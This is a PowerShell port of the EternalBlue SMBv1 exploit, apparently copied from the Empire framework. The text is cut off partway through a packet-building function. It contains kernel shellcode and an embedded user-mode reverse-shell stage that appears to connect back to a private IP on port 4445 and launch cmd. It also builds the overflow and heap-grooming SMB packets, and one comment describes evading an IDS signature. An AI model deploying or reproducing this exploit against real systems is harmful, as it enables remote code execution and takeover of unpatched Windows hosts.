#Tham khảo từ bạn bè
#nguồn git gốc:https://github.com/EmpireProject/Empire/blob/master/data/module_source/exploitation/Exploit-EternalBlue.ps1
function Myfun($Target)
{
#$Target=Read-Host
$InitialGrooms=12
$MaxAttempts=12
#$Shellcode= Get-Content "sc_x64.bin"
#Write-Host "Myfunction is done"
#Write-Host $Target

$enc = [system.Text.Encoding]::ASCII


$GROOM_DELTA = 5


function make_kernel_shellcode {
    [Byte[]] $shellcode =@(0x55 ,0xe8 ,0x2e ,0x00 ,0x00 ,0x00 ,0xb9 ,0x82 ,0x00 ,0x00 ,0xc0 ,0x0f ,0x32 ,0x4c ,0x8d ,0x0d ,0x34 ,0x00 ,0x00 ,0x00 ,0x44 ,0x39 ,0xc8 ,0x74 ,0x19 ,0x39 ,0x45 ,0x00 ,0x74 ,0x0a ,0x89 ,0x55 ,0x04 ,0x89 ,0x45 ,0x00 ,0xc6 ,0x45 ,0xf8 ,0x00 ,0x49 ,0x91 ,0x50 ,0x5a ,0x48 ,0xc1 ,0xea ,0x20 ,0x0f ,0x30 ,0x5d ,0xc3 ,0x48 ,0x8d ,0x2d ,0x00 ,0x10 ,0x00 ,0x00 ,0x48 ,0xc1 ,0xed ,0x0c ,0x48 ,0xc1 ,0xe5 ,0x0c ,0x48 ,0x83 ,0xed ,0x70 ,0xc3 ,0x0f ,0x01 ,0xf8 ,0x65 ,0x48 ,0x89 ,0x24 ,0x25 ,0x10 ,0x00 ,0x00 ,0x00 ,0x65 ,0x48 ,0x8b ,0x24 ,0x25 ,0xa8 ,0x01 ,0x00 ,0x00 ,0x6a ,0x2b ,0x65 ,0xff ,0x34 ,0x25 ,0x10 ,0x00 ,0x00 ,0x00 ,0x50 ,0x50 ,0x55 ,0xe8 ,0xc5 ,0xff ,0xff ,0xff ,0x48 ,0x8b ,0x45 ,0x00 ,0x48 ,0x83 ,0xc0 ,0x1f ,0x48 ,0x89 ,0x44 ,0x24 ,0x10 ,0x51 ,0x52 ,0x41 ,0x50 ,0x41 ,0x51 ,0x41 ,0x52 ,0x41 ,0x53 ,0x31 ,0xc0 ,0xb2 ,0x01 ,0xf0 ,0x0f ,0xb0 ,0x55 ,0xf8 ,0x75 ,0x14 ,0xb9 ,0x82 ,0x00 ,0x00 ,0xc0 ,0x8b ,0x45 ,0x00 ,0x8b ,0x55 ,0x04 ,0x0f ,0x30 ,0xfb ,0xe8 ,0x0e ,0x00 ,0x00 ,0x00 ,0xfa ,0x41 ,0x5b ,0x41 ,0x5a ,0x41 ,0x59 ,0x41 ,0x58 ,0x5a ,0x59 ,0x5d ,0x58 ,0xc3 ,0x41 ,0x57 ,0x41 ,0x56 ,0x57 ,0x56 ,0x53 ,0x50 ,0x4c ,0x8b ,0x7d ,0x00 ,0x49 ,0xc1 ,0xef ,0x0c ,0x49 ,0xc1 ,0xe7 ,0x0c ,0x49 ,0x81 ,0xef ,0x00 ,0x10 ,0x00 ,0x00 ,0x66 ,0x41 ,0x81 ,0x3f ,0x4d ,0x5a ,0x75 ,0xf1 ,0x4c ,0x89 ,0x7d ,0x08 ,0x65 ,0x4c ,0x8b ,0x34 ,0x25 ,0x88 ,0x01 ,0x00 ,0x00 ,0xbf ,0x78 ,0x7c ,0xf4 ,0xdb ,0xe8 ,0x01 ,0x01 ,0x00 ,0x00 ,0x48 ,0x91 ,0xbf ,0x3f ,0x5f ,0x64 ,0x77 ,0xe8 ,0xfc ,0x00 ,0x00 ,0x00 ,0x8b ,0x40 ,0x03 ,0x89 ,0xc3 ,0x3d ,0x00 ,0x04 ,0x00 ,0x00 ,0x72 ,0x03 ,0x83 ,0xc0 ,0x10 ,0x48 ,0x8d ,0x50 ,0x28 ,0x4c ,0x8d ,0x04 ,0x11 ,0x4d ,0x89 ,0xc1 ,0x4d ,0x8b ,0x09 ,0x4d ,0x39 ,0xc8 ,0x0f ,0x84 ,0xc6 ,0x00 ,0x00 ,0x00 ,0x4c ,0x89 ,0xc8 ,0x4c ,0x29 ,0xf0 ,0x48 ,0x3d ,0x00 ,0x07 ,0x00 ,0x00 ,0x77 ,0xe6 ,0x4d ,0x29 ,0xce ,0xbf ,0xe1 ,0x14 ,0x01 ,0x17 ,0xe8 ,0xbb ,0x00 ,0x00 ,0x00 ,0x8b ,0x78 ,0x03 ,0x83 ,0xc7 ,0x08 ,0x48 ,0x8d ,0x34 ,0x19 ,0xe8 ,0xf4 ,0x00 ,0x00 ,0x00 ,0x3d ,0x5a ,0x6a ,0xfa ,0xc1 ,0x74 ,0x10 ,0x3d ,0xd8 ,0x83 ,0xe0 ,0x3e ,0x74 ,0x09 ,0x48 ,0x8b ,0x0c ,0x39 ,0x48 ,0x29 ,0xf9 ,0xeb ,0xe0 ,0xbf ,0x48 ,0xb8 ,0x18 ,0xb8 ,0xe8 ,0x84 ,0x00 ,0x00 ,0x00 ,0x48 ,0x89 ,0x45 ,0xf0 ,0x48 ,0x8d ,0x34 ,0x11 ,0x48 ,0x89 ,0xf3 ,0x48 ,0x8b ,0x5b ,0x08 ,0x48 ,0x39 ,0xde ,0x74 ,0xf7 ,0x4a ,0x8d ,0x14 ,0x33 ,0xbf ,0x3e ,0x4c ,0xf8 ,0xce ,0xe8 ,0x69 ,0x00 ,0x00 ,0x00 ,0x8b ,0x40 ,0x03 ,0x48 ,0x83 ,0x7c ,0x02 ,0xf8 ,0x00 ,0x74 ,0xde ,0x48 ,0x8d ,0x4d ,0x10 ,0x4d ,0x31 ,0xc0 ,0x4c ,0x8d ,0x0d ,0xa9 ,0x00 ,0x00 ,0x00 ,0x55 ,0x6a ,0x01 ,0x55 ,0x41 ,0x50 ,0x48 ,0x83 ,0xec ,0x20 ,0xbf ,0xc4 ,0x5c ,0x19 ,0x6d ,0xe8 ,0x35 ,0x00 ,0x00 ,0x00 ,0x48 ,0x8d ,0x4d ,0x10 ,0x4d ,0x31 ,0xc9 ,0xbf ,0x34 ,0x46 ,0xcc ,0xaf ,0xe8 ,0x24 ,0x00 ,0x00 ,0x00 ,0x48 ,0x83 ,0xc4 ,0x40 ,0x85 ,0xc0 ,0x74 ,0xa3 ,0x48 ,0x8b ,0x45 ,0x20 ,0x80 ,0x78 ,0x1a ,0x01 ,0x74 ,0x09 ,0x48 ,0x89 ,0x00 ,0x48 ,0x89 ,0x40 ,0x08 ,0xeb ,0x90 ,0x58 ,0x5b ,0x5e ,0x5f ,0x41 ,0x5e ,0x41 ,0x5f ,0xc3 ,0xe8 ,0x02 ,0x00 ,0x00 ,0x00 ,0xff ,0xe0 ,0x53 ,0x51 ,0x56 ,0x41 ,0x8b ,0x47 ,0x3c ,0x41 ,0x8b ,0x84 ,0x07 ,0x88 ,0x00 ,0x00 ,0x00 ,0x4c ,0x01 ,0xf8 ,0x50 ,0x8b ,0x48 ,0x18 ,0x8b ,0x58 ,0x20 ,0x4c ,0x01 ,0xfb ,0xff ,0xc9 ,0x8b ,0x34 ,0x8b ,0x4c ,0x01 ,0xfe ,0xe8 ,0x1f ,0x00 ,0x00 ,0x00 ,0x39 ,0xf8 ,0x75 ,0xef ,0x58 ,0x8b ,0x58 ,0x24 ,0x4c ,0x01 ,0xfb ,0x66 ,0x8b ,0x0c ,0x4b ,0x8b ,0x58 ,0x1c ,0x4c ,0x01 ,0xfb ,0x8b ,0x04 ,0x8b ,0x4c ,0x01 ,0xf8 ,0x5e ,0x59 ,0x5b ,0xc3 ,0x52 ,0x31 ,0xc0 ,0x99 ,0xac ,0xc1 ,0xca ,0x0d ,0x01 ,0xc2 ,0x85 ,0xc0 ,0x75 ,0xf6 ,0x92 ,0x5a ,0xc3 ,0x55 ,0x53 ,0x57 ,0x56 ,0x41 ,0x57 ,0x49 ,0x8b ,0x28 ,0x4c ,0x8b ,0x7d ,0x08 ,0x52 ,0x5e ,0x4c ,0x89 ,0xcb ,0x31 ,0xc0 ,0x44 ,0x0f ,0x22 ,0xc0 ,0x48 ,0x89 ,0x02 ,0x89 ,0xc1 ,0x48 ,0xf7 ,0xd1 ,0x49 ,0x89 ,0xc0 ,0xb0 ,0x40 ,0x50 ,0xc1 ,0xe0 ,0x06 ,0x50 ,0x49 ,0x89 ,0x01 ,0x48 ,0x83 ,0xec ,0x20 ,0xbf ,0xea ,0x99 ,0x6e ,0x57 ,0xe8 ,0x65 ,0xff ,0xff ,0xff ,0x48 ,0x83 ,0xc4 ,0x30 ,0x85 ,0xc0 ,0x75 ,0x45 ,0x48 ,0x8b ,0x3e ,0x48 ,0x8d ,0x35 ,0x4d ,0x00 ,0x00 ,0x00 ,0xb9 ,0x00 ,0x06 ,0x00 ,0x00 ,0xf3 ,0xa4 ,0x48 ,0x8b ,0x45 ,0xf0 ,0x48 ,0x8b ,0x40 ,0x18 ,0x48 ,0x8b ,0x40 ,0x20 ,0x48 ,0x8b ,0x00 ,0x66 ,0x83 ,0x78 ,0x48 ,0x18 ,0x75 ,0xf6 ,0x48 ,0x8b ,0x50 ,0x50 ,0x81 ,0x7a ,0x0c ,0x33 ,0x00 ,0x32 ,0x00 ,0x75 ,0xe9 ,0x4c ,0x8b ,0x78 ,0x20 ,0xbf ,0x5e ,0x51 ,0x5e ,0x83 ,0xe8 ,0x22 ,0xff ,0xff ,0xff ,0x48 ,0x89 ,0x03 ,0x31 ,0xc9 ,0x88 ,0x4d ,0xf8 ,0xb1 ,0x01 ,0x44 ,0x0f ,0x22 ,0xc1 ,0x41 ,0x5f ,0x5e ,0x5f ,0x5b ,0x5d ,0xc3 ,0x48 ,0x92 ,0x31 ,0xc9 ,0x51 ,0x51 ,0x49 ,0x89 ,0xc9 ,0x4c ,0x8d ,0x05 ,0x0d ,0x00 ,0x00 ,0x00 ,0x89 ,0xca ,0x48 ,0x83 ,0xec ,0x20 ,0xff ,0xd0 ,0x48 ,0x83 ,0xc4 ,0x30 ,0xc3 ,0xfc ,0x48 ,0x83 ,0xe4 ,0xf0 ,0xe8 ,0xc0 ,0x00 ,0x00 ,0x00 ,0x41 ,0x51 ,0x41 ,0x50 ,0x52 ,0x51 ,0x56 ,0x48 ,0x31 ,0xd2 ,0x65 ,0x48 ,0x8b ,0x52 ,0x60 ,0x48 ,0x8b ,0x52 ,0x18 ,0x48 ,0x8b ,0x52 ,0x20 ,0x48 ,0x8b ,0x72 ,0x50 ,0x48 ,0x0f ,0xb7 ,0x4a ,0x4a ,0x4d ,0x31 ,0xc9 ,0x48 ,0x31 ,0xc0 ,0xac ,0x3c ,0x61 ,0x7c ,0x02 ,0x2c ,0x20 ,0x41 ,0xc1 ,0xc9 ,0x0d ,0x41 ,0x01 ,0xc1 ,0xe2 ,0xed ,0x52 ,0x41 ,0x51 ,0x48 ,0x8b ,0x52 ,0x20 ,0x8b ,0x42 ,0x3c ,0x48 ,0x01 ,0xd0 ,0x8b ,0x80 ,0x88 ,0x00 ,0x00 ,0x00 ,0x48 ,0x85 ,0xc0 ,0x74 ,0x67 ,0x48 ,0x01 ,0xd0 ,0x50 ,0x8b ,0x48 ,0x18 ,0x44 ,0x8b ,0x40 ,0x20 ,0x49 ,0x01 ,0xd0 ,0xe3 ,0x56 ,0x48 ,0xff ,0xc9 ,0x41 ,0x8b ,0x34 ,0x88 ,0x48 ,0x01 ,0xd6 ,0x4d ,0x31 ,0xc9 ,0x48 ,0x31 ,0xc0 ,0xac ,0x41 ,0xc1 ,0xc9 ,0x0d ,0x41 ,0x01 ,0xc1 ,0x38 ,0xe0 ,0x75 ,0xf1 ,0x4c ,0x03 ,0x4c ,0x24 ,0x08 ,0x45 ,0x39 ,0xd1 ,0x75 ,0xd8 ,0x58 ,0x44 ,0x8b ,0x40 ,0x24 ,0x49 ,0x01 ,0xd0 ,0x66 ,0x41 ,0x8b ,0x0c ,0x48 ,0x44 ,0x8b ,0x40 ,0x1c ,0x49 ,0x01 ,0xd0 ,0x41 ,0x8b ,0x04 ,0x88 ,0x48 ,0x01 ,0xd0 ,0x41 ,0x58 ,0x41 ,0x58 ,0x5e ,0x59 ,0x5a ,0x41 ,0x58 ,0x41 ,0x59 ,0x41 ,0x5a ,0x48 ,0x83 ,0xec ,0x20 ,0x41 ,0x52 ,0xff ,0xe0 ,0x58 ,0x41 ,0x59 ,0x5a ,0x48 ,0x8b ,0x12 ,0xe9 ,0x57 ,0xff ,0xff ,0xff ,0x5d ,0x49 ,0xbe ,0x77 ,0x73 ,0x32 ,0x5f ,0x33 ,0x32 ,0x00 ,0x00 ,0x41 ,0x56 ,0x49 ,0x89 ,0xe6 ,0x48 ,0x81 ,0xec ,0xa0 ,0x01 ,0x00 ,0x00 ,0x49 ,0x89 ,0xe5 ,0x49 ,0xbc ,0x02 ,0x00 ,0x11 ,0x5d ,0xc0 ,0xa8 ,0x6f ,0x8a ,0x41 ,0x54 ,0x49 ,0x89 ,0xe4 ,0x4c ,0x89 ,0xf1 ,0x41 ,0xba ,0x4c ,0x77 ,0x26 ,0x07 ,0xff ,0xd5 ,0x4c ,0x89 ,0xea ,0x68 ,0x01 ,0x01 ,0x00 ,0x00 ,0x59 ,0x41 ,0xba ,0x29 ,0x80 ,0x6b ,0x00 ,0xff ,0xd5 ,0x50 ,0x50 ,0x4d ,0x31 ,0xc9 ,0x4d ,0x31 ,0xc0 ,0x48 ,0xff ,0xc0 ,0x48 ,0x89 ,0xc2 ,0x48 ,0xff ,0xc0 ,0x48 ,0x89 ,0xc1 ,0x41 ,0xba ,0xea ,0x0f ,0xdf ,0xe0 ,0xff ,0xd5 ,0x48 ,0x89 ,0xc7 ,0x6a ,0x10 ,0x41 ,0x58 ,0x4c ,0x89 ,0xe2 ,0x48 ,0x89 ,0xf9 ,0x41 ,0xba ,0x99 ,0xa5 ,0x74 ,0x61 ,0xff ,0xd5 ,0x48 ,0x81 ,0xc4 ,0x40 ,0x02 ,0x00 ,0x00 ,0x49 ,0xb8 ,0x63 ,0x6d ,0x64 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x41 ,0x50 ,0x41 ,0x50 ,0x48 ,0x89 ,0xe2 ,0x57 ,0x57 ,0x57 ,0x4d ,0x31 ,0xc0 ,0x6a ,0x0d ,0x59 ,0x41 ,0x50 ,0xe2 ,0xfc ,0x66 ,0xc7 ,0x44 ,0x24 ,0x54 ,0x01 ,0x01 ,0x48 ,0x8d ,0x44 ,0x24 ,0x18 ,0xc6 ,0x00 ,0x68 ,0x48 ,0x89 ,0xe6 ,0x56 ,0x50 ,0x41 ,0x50 ,0x41 ,0x50 ,0x41 ,0x50 ,0x49 ,0xff ,0xc0 ,0x41 ,0x50 ,0x49 ,0xff ,0xc8 ,0x4d ,0x89 ,0xc1 ,0x4c ,0x89 ,0xc1 ,0x41 ,0xba ,0x79 ,0xcc ,0x3f ,0x86 ,0xff ,0xd5 ,0x48 ,0x31 ,0xd2 ,0x48 ,0xff ,0xca ,0x8b ,0x0e ,0x41 ,0xba ,0x08 ,0x87 ,0x1d ,0x60 ,0xff ,0xd5 ,0xbb ,0xe0 ,0x1d ,0x2a ,0x0a ,0x41 ,0xba ,0xa6 ,0x95 ,0xbd ,0x9d ,0xff ,0xd5 ,0x48 ,0x83 ,0xc4 ,0x28 ,0x3c ,0x06 ,0x7c ,0x0a ,0x80 ,0xfb ,0xe0 ,0x75 ,0x05 ,0xbb ,0x47 ,0x13 ,0x72 ,0x6f ,0x6a ,0x00 ,0x59 ,0x41 ,0x89 ,0xda ,0xff ,0xd5)
return $shellcode
}

function make_kernel_user_payload($ring3) {
    $sc = make_kernel_shellcode
    $sc += [bitconverter]::GetBytes([uint16] ($ring3.length))
    $sc += $ring3
    return $sc
 }
function make_smb2_payload_headers_packet(){
    [Byte[]] $pkt = [Byte[]](0x00,0x00,0xff,0xf7,0xFE) + [system.Text.Encoding]::ASCII.GetBytes("SMB") + [Byte[]](0x00)*124

    return $pkt
}

function make_smb2_payload_body_packet($kernel_user_payload) {
    $pkt_max_len = 4204
    $pkt_setup_len = 497
    $pkt_max_payload = $pkt_max_len - $pkt_setup_len

    #padding
    [Byte[]] $pkt = [Byte[]] (0x00) * 0x8
    $pkt += 0x03,0x00,0x00,0x00
    $pkt += [Byte[]] (0x00) * 0x1c
    $pkt += 0x03,0x00,0x00,0x00
     $pkt += [Byte[]] (0x00) * 0x74

# KI_USER_SHARED_DATA addresses
    $pkt += [Byte[]] (0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff) * 2 # x64 address
    $pkt += [Byte[]] (0x00) * 0x10
    $pkt += [Byte[]] (0xc0,0xf0,0xdf,0xff) * 2                 # x86 address
    $pkt += [Byte[]] (0x00) * 0xc4

    # payload addreses
    $pkt += 0x90,0xf1,0xdf,0xff
    $pkt += [Byte[]] (0x00) * 0x4
    $pkt += 0xf0,0xf1,0xdf,0xff
    $pkt += [Byte[]] (0x00) * 0x40

    $pkt += 0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff
    $pkt += [Byte[]] (0x00) * 0x8
    $pkt += 0x00,0x02,0xd0,0xff,0xff,0xff,0xff,0xff
    $pkt += 0x00

    $pkt += $kernel_user_payload

    # fill out the rest, this can be randomly generated
    $pkt += 0x00 * ($pkt_max_payload - $kernel_user_payload.length)

    return  $pkt
}

function make_smb1_echo_packet($tree_id, $user_id) {
    [Byte[]]  $pkt = [Byte[]] (0x00)               # type
    $pkt += 0x00,0x00,0x31       # len = 49
    $pkt += [Byte[]] (0xff) + $enc.GetBytes("SMB")            # SMB1
    $pkt += 0x2b               # Echo
    $pkt += 0x00,0x00,0x00,0x00   # Success
    $pkt += 0x18               # flags
    $pkt += 0x07,0xc0           # flags2
    $pkt += 0x00,0x00           # PID High
    $pkt += 0x00,0x00,0x00,0x00   # Signature1
    $pkt += 0x00,0x00,0x00,0x00   # Signature2
    $pkt += 0x00,0x00           # Reserved
    $pkt += $tree_id # Tree ID
    $pkt += 0xff,0xfe           # PID
    $pkt += $user_id # UserID
    $pkt += 0x40,0x00           # MultiplexIDs

    $pkt += 0x01               # Word count
    $pkt += 0x01,0x00           # Echo count
    $pkt += 0x0c,0x00           # Byte count

    # echo data
    # this is an existing IDS signature, and can be nulled out
    #$pkt += 0x4a,0x6c,0x4a,0x6d,0x49,0x68,0x43,0x6c,0x42,0x73,0x72,0x00
    $pkt +=  0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x00
    return $pkt
}

function make_smb1_trans2_exploit_packet($tree_id, $user_id, $type, $timeout) {
    $timeout = ($timeout * 0x10) + 3

    [Byte[]]  $pkt = [Byte[]] (0x00)                   # Session message
    $pkt += 0x00,0x10,0x35           # length
    $pkt += 0xff,0x53,0x4D,0x42                # SMB1
    $pkt += 0x33                   # Trans2 request
    $pkt += 0x00,0x00,0x00,0x00       # NT SUCCESS
    $pkt += 0x18                   # Flags
    $pkt += 0x07,0xc0               # Flags2
    $pkt += 0x00,0x00               # PID High
    $pkt += 0x00,0x00,0x00,0x00       # Signature1
    $pkt += 0x00,0x00,0x00,0x00       # Signature2
    $pkt += 0x00,0x00               # Reserved
    $pkt += $user_id       # TreeID
    $pkt += 0xff,0xfe               # PID
    $pkt += $user_id     # UserID
    $pkt += 0x40,0x00               # MultiplexIDs

    $pkt += 0x09                   # Word Count
    $pkt += 0x00,0x00               # Total Param Count
    $pkt += 0x00,0x10               # Total Data Count
    $pkt += 0x00,0x00               # Max Param Count
    $pkt += 0x00,0x00               # Max Data Count
    $pkt += 0x00                   # Max Setup Count
    $pkt += 0x00                   # Reserved
    $pkt += 0x00,0x10               # Flags
    $pkt += 0x35,0x00,0xd0           # Timeouts
    $pkt += [bitconverter]::GetBytes($timeout)[0] #timeout is a single int
    $pkt += 0x00,0x00               # Reserved
    $pkt += 0x00,0x10               # Parameter Count

    #$pkt += 0x74,0x70               # Parameter Offset
    #$pkt += 0x47,0x46               # Data Count
    #$pkt += 0x45,0x6f               # Data Offset
    #$pkt += 0x4c                   # Setup Count
    #$pkt += 0x4f                   # Reserved

    if ($type -eq "eb_trans2_exploit") {

      $pkt += [Byte[]] (0x41) * 2957

      $pkt += 0x80,0x00,0xa8,0x00                     # overflow

      $pkt += [Byte[]] (0x00) * 0x10
      $pkt += 0xff,0xff
      $pkt += [Byte[]] (0x00) * 0x6
      $pkt += 0xff,0xff
      $pkt += [Byte[]] (0x00) * 0x16

      $pkt += 0x00,0xf1,0xdf,0xff             # x86 addresses
      $pkt += [Byte[]] (0x00) * 0x8
      $pkt += 0x20,0xf0,0xdf,0xff

      $pkt += 0x00,0xf1,0xdf,0xff,0xff,0xff,0xff,0xff # x64

      $pkt += 0x60,0x00,0x04,0x10
      $pkt += [Byte[]] (0x00) * 4

      $pkt += 0x80,0xef,0xdf,0xff

      $pkt += [Byte[]] (0x00) * 4
      $pkt += 0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff
      $pkt += 0x18,0x01,0xd0,0xff,0xff,0xff,0xff,0xff
      $pkt += [Byte[]] (0x00) * 0x10

      $pkt += 0x60,0x00,0x04,0x10
      $pkt += [Byte[]] (0x00) * 0xc
      $pkt += 0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff
      $pkt += [Byte[]] (0x00) * 0x8
      $pkt += 0x80,0x10
      $pkt += [Byte[]] (0x00) * 0xe
      $pkt += 0x39
      $pkt += 0xbb

      $pkt += [Byte[]] (0x41) * 965

      return $pkt
    }

    if($type -eq "eb_trans2_zero") {
      $pkt += [Byte[]] (0x00) * 2055
      $pkt += 0x83,0xf3
      $pkt += [Byte[]] (0x41) * 2039
      #$pkt += 0x00 * 4096
     }
    else {
      $pkt += [Byte[]] (0x41) * 4096
    }

    return $pkt
  }
function negotiate_proto_request()
{

      [Byte[]]  $pkt = [Byte[]] (0x00)             # Message_Type
      $pkt += 0x00,0x00,0x54       # Length

      $pkt += 0xFF,0x53,0x4D,0x42 # server_component: .SMB
      $pkt += 0x72             # smb_command: Negotiate Protocol
      $pkt += 0x00,0x00,0x00,0x00 # nt_status
      $pkt += 0x18             # flags
      $pkt +=  0x01,0x28         # flags2
      $pkt += 0x00,0x00         # process_id_high
      $pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 # signature
      $pkt += 0x00,0x00         # reserved
      $pkt += 0x00,0x00         # tree_id
      $pkt += 0x2F,0x4B         # process_id
      $pkt += 0x00,0x00         # user_id
      $pkt += 0xC5,0x5E           # multiplex_id

      $pkt += 0x00             # word_count
      $pkt += 0x31,0x00         # byte_count

      # Requested Dialects
      $pkt += 0x02             # dialet_buffer_format
      $pkt += 0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x31,0x2E,0x30,0x00  # dialet_name: LANMAN1.0

      $pkt += 0x02             # dialet_buffer_format
      $pkt += 0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,0x00  # dialet_name: LM1.2X002

      $pkt += 0x02             # dialet_buffer_format
      $pkt += 0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,0x30,0x00 # dialet_name3: NT LANMAN 1.0

      $pkt += 0x02             # dialet_buffer_format
      $pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00   # dialet_name4: NT LM 0.12

      return $pkt
}


function make_smb1_nt_trans_packet($tree_id, $user_id) {

    [Byte[]]  $pkt = [Byte[]] (0x00)                   # Session message
    $pkt += 0x00,0x04,0x38           # length
    $pkt += 0xff,0x53,0x4D,0x42       # SMB1
    $pkt += 0xa0                   # NT Trans
    $pkt += 0x00,0x00,0x00,0x00       # NT SUCCESS
    $pkt += 0x18                   # Flags
    $pkt += 0x07,0xc0               # Flags2
    $pkt += 0x00,0x00               # PID High
    $pkt += 0x00,0x00,0x00,0x00       # Signature1
    $pkt += 0x00,0x00,0x00,0x00       # Signature2
    $pkt += 0x00,0x00               # Reserved
    $pkt += $tree_id       # TreeID
    $pkt += 0xff,0xfe               # PID
    $pkt += $user_id       # UserID
    $pkt += 0x40,0x00               # MultiplexID

    $pkt += 0x14                   # Word Count
    $pkt += 0x01                   # Max Setup Count
    $pkt += 0x00,0x00               # Reserved
    $pkt += 0x1e,0x00,0x00,0x00       # Total Param Count
    $pkt += 0xd0,0x03,0x01,0x00       # Total Data Count
    $pkt += 0x1e,0x00,0x00,0x00       # Max Param Count
    $pkt += 0x00,0x00,0x00,0x00       # Max Data Count
    $pkt += 0x1e,0x00,0x00,0x00       # Param Count
    $pkt += 0x4b,0x00,0x00,0x00       # Param Offset
    $pkt += 0xd0,0x03,0x00,0x00       # Data Count
    $pkt += 0x68,0x00,0x00,0x00       # Data Offset
    $pkt += 0x01                   # Setup Count
    $pkt += 0x00,0x00               # Function <unknown>
    $pkt += 0x00,0x00               # Unknown NT transaction (0) setup
    $pkt += 0xec,0x03               # Byte Count
    $pkt += [Byte[]] (0x00) * 0x1f            # NT Parameters

    # undocumented
    $pkt += 0x01
    $pkt += [Byte[]](0x00) * 0x3cd
    return $pkt
  }

  function  make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) {

    [Byte[]] $pkt = 0x00                   # Session message
    $pkt += 0x00,0x00,0x51           # length
    $pkt += 0xff,0x53,0x4D,0x42       # SMB1
    $pkt += 0x73                   # Session Setup AndX
    $pkt += 0x00,0x00,0x00,0x00       # NT SUCCESS
    $pkt += 0x18                   # Flags
    $pkt += $flags2                   # Flags2
    $pkt += 0x00,0x00               # PID High
    $pkt += 0x00,0x00,0x00,0x00       # Signature1
    $pkt += 0x00,0x00,0x00,0x00       # Signature2
    $pkt += 0x00,0x00               # Reserved
    $pkt += 0x00,0x00               # TreeID
    $pkt += 0xff,0xfe               # PID
    $pkt += 0x00,0x00               # UserID
    $pkt += 0x40,0x00               # MultiplexID
    #$pkt += 0x00,0x00               # Reserved

    $pkt += 0x0c                   # Word Count
    $pkt += 0xff                   # No further commands
    $pkt += 0x00                   # Reserved
    $pkt += 0x00,0x00               # AndXOffset
    $pkt += 0x04,0x11               # Max Buffer
    $pkt += 0x0a,0x00               # Max Mpx Count
    $pkt += $vcnum                    # VC Number
    $pkt += 0x00,0x00,0x00,0x00       # Session key
    $pkt += 0x00,0x00               # Security blob length
    $pkt += 0x00,0x00,0x00,0x00       # Reserved
    $pkt += 0x00,0x00,0x00,0x80       # Capabilities
    $pkt += 0x16,0x00               # Byte count
    #$pkt += 0xf0                   # Security Blob: <MISSING>
    #$pkt += 0xff,0x00,0x00,0x00       # Native OS
    #$pkt += 0x00,0x00               # Native LAN manager
    #$pkt += 0x00,0x00               # Primary domain
    $pkt += $native_os
    $pkt += [Byte[]] (0x00) * 17              # Extra byte params

    return $pkt
  }

  function  make_smb1_anonymous_login_packet {
    # Neither Rex nor RubySMB appear to support Anon login?

    [Byte[]] $pkt = [Byte[]] (0x00)                    # Session message
    $pkt += 0x00,0x00,0x88           # length
    $pkt += 0xff,0x53,0x4D,0x42             # SMB1
    $pkt += 0x73                   # Session Setup AndX
    $pkt += 0x00,0x00,0x00,0x00       # NT SUCCESS
    $pkt += 0x18                   # Flags
    $pkt += 0x07,0xc0               # Flags2
    $pkt += 0x00,0x00               # PID High
    $pkt += 0x00,0x00,0x00,0x00       # Signature1
    $pkt += 0x00,0x00,0x00,0x00       # Signature2
    $pkt += 0x00,0x00               # TreeID
    $pkt += 0xff,0xfe               # PID
    $pkt += 0x00,0x00               # Reserved
    $pkt += 0x00,0x00               # UserID
    $pkt += 0x40,0x00               # MultiplexID

    $pkt += 0x0d                   # Word Count
    $pkt += 0xff                   # No further commands
    $pkt += 0x00                   # Reserved
    $pkt += 0x88,0x00               # AndXOffset
    $pkt += 0x04,0x11               # Max Buffer
    $pkt += 0x0a,0x00               # Max Mpx Count
    $pkt += 0x00,0x00               # VC Number
    $pkt += 0x00,0x00,0x00,0x00       # Session key
    $pkt += 0x01,0x00               # ANSI pw length
    $pkt += 0x00,0x00               # Unicode pw length
    $pkt += 0x00,0x00,0x00,0x00       # Reserved
    $pkt += 0xd4,0x00,0x00,0x00       # Capabilities
    $pkt += 0x4b,0x00               # Byte count
    $pkt += 0x00                   # ANSI pw
    $pkt += 0x00,0x00               # Account name
    $pkt += 0x00,0x00               # Domain name

    # Windows 2000 2195
    $pkt += 0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x32
    $pkt += 0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x20,0x00,0x32,0x00,0x31,0x00,0x39,0x00,0x35,0x00
    $pkt += 0x00,0x00

    # Windows 2000 5.0
    $pkt += 0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x32
    $pkt += 0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x20,0x00,0x35,0x00,0x2e,0x00,0x30,0x00,0x00,0x00

    return $pkt
}


function tree_connect_andx_request($Target, $userid) {

     [Byte[]] $pkt = [Byte[]](0x00)              #$pkt +=Message_Type'
     $pkt +=0x00,0x00,0x47       #$pkt +=Length'


     $pkt +=0xFF,0x53,0x4D,0x42  #$pkt +=server_component': .SMB
     $pkt +=0x75              #$pkt +=smb_command': Tree Connect AndX
     $pkt +=0x00,0x00,0x00,0x00  #$pkt +=nt_status'
     $pkt +=0x18              #$pkt +=flags'
     $pkt +=0x01,0x20          #$pkt +=flags2'
     $pkt +=0x00,0x00          #$pkt +=process_id_high'
     $pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  #$pkt +=signature'
     $pkt +=0x00,0x00          #$pkt +=reserved'
     $pkt +=0x00,0x00          #$pkt +=tree_id'
     $pkt +=0x2F,0x4B          #$pkt +=process_id'
     $pkt += $userid              #$pkt +=user_id'
     $pkt +=0xC5,0x5E           #$pkt +=multiplex_id'


